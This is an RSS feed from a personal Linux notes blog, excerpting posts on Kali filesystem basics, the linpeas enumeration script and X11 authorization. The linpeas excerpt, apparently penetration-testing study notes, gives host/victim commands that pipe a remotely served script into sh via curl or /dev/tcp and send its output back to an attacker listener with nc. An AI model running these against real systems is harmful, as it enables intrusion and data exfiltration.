<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Linux on Owlglass</title>
    <link>https://kdbed.github.io/tags/linux/</link>
    <description>Recent content in Linux on Owlglass</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <atom:link href="https://kdbed.github.io/tags/linux/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Kali Linux - Basics</title>
      <link>https://kdbed.github.io/posts/kali_basics/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/kali_basics/</guid>
      <description>:ID: cb51a9d3-842b-4b10-ae56-2d18573b5f3e&#xA;:END:&#xA;Filesystem FHS - Filesystem Hierarchy Standard - conventions used for layout of a UNIX system LinuxFoundation&#xA;/bin : basic programs like ls, cd, cat /sbin : system programs like fdisk, makefs, sysctl /etc : configuration files bk /tmp : temporary files, typically deleted on boot /usr/bin : applications like apt, ncat, nmap /usr/share : application support and data files Basic Linux commands Finding files which searches through directories in the $PATH environment variable for a given file name; returns the full path to the file if a match is found</description>
    </item>
    <item>
      <title>linpeas</title>
      <link>https://kdbed.github.io/posts/linpeas/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/linpeas/</guid>
      <description>See carlospolop : PEASS-ng hacktricks&#xA;Execution: Run from memory and send back to attacker:&#xA;# Local network sudo python -m SimpleHTTPServer 80 #Host curl 10.10.10.10/linpeas.sh | sh #Victim # Without curl sudo nc -q 5 -lvnp 80 &amp;lt; linpeas.sh #Host cat &amp;lt; /dev/tcp/10.10.10.10/80 | sh #Victim # Excute from memory and send output back to the host nc -lvnp 9002 | tee linpeas.out #Host curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.</description>
    </item>
    <item>
      <title>X11 Authorization</title>
      <link>https://kdbed.github.io/posts/x11_authorization/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/x11_authorization/</guid>
      <description>X11 Authorization https://stackoverflow.com/questions/37157097/how-does-x11-authorization-work-mit-magic-cookie/37367518#37367518&#xA;Well, first of all there is a file ~/.Xauthority on the machine. Notice that (usually on machine with GUI) wrong permissions of this file, can cause a login screen loop&amp;hellip; (took me hours to understand that).&#xA;As you mentioned there are 5 mechanisms:&#xA;Host access: the server has host access list (if a network address exists in this list, the connection is permitted). the list is managed using xhost command.</description>
    </item>
  </channel>
</rss>
